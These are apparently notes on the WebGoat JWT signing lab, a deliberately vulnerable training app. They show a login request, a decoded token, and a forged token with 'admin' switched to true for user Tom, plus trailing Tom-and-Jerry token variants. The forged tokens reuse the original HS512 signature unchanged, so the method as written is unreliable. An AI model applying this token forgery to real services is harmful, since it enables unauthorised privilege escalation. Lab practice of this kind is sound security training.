# JWT Tokens

## 4 - JWT Signing

Steps:
1. Change the user from Guest to Tom
2. Get the access of Tom from 
Request:
```GET /WebGoat/JWT/votings/login?user=Tom```
Response
```eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE2MDI2OTEwNzIsImFkbWluIjoiZmFsc2UiLCJ1c2VyIjoiVG9tIn0.sZcWHBuLeFJjTbKx8WckbC7XaYTg7jQ2p2RBnuFkrBYyypU9-yS5H49Bpt05qQTKaVyZ_VCmyWRBEU-Ywonl-w```
3. Decode the JWT token
JWT Header: {"alg":"HS512"} 
JWT Payload: {"iat":1602691072,"admin":"false","user":"Tom"}

4. Change its value and encode the JWT token
New JWT Payload: {"iat":1602691072,"admin":"true","user":"Tom"}
New JWT token:
```eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE2MDI2OTEwNzIsImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ.sZcWHBuLeFJjTbKx8WckbC7XaYTg7jQ2p2RBnuFkrBYyypU9-yS5H49Bpt05qQTKaVyZ_VCmyWRBEU-Ywonl-w```


5. Vote using the new JWT token









eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE2MDI2OTIxMDgsImFkbWluIjoiZmFsc2UiLCJ1c2VyIjoiSmVycnkifQ.dDr0hwf00nFdaTPnXLV5H3SaJwAM-P5xZX_ULqtaF3ho7XdJ1LOvFRlM_UTv7UxIvGvccRsh75IxwzQ_dHP3vg
eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE2MDI2OTIxMDgsImFkbWluIjoidHJ1ZSIsInVzZXIiOiJKZXJyeSJ9.dDr0hwf00nFdaTPnXLV5H3SaJwAM-P5xZX_ULqtaF3ho7XdJ1LOvFRlM_UTv7UxIvGvccRsh75IxwzQ_dHP3vg
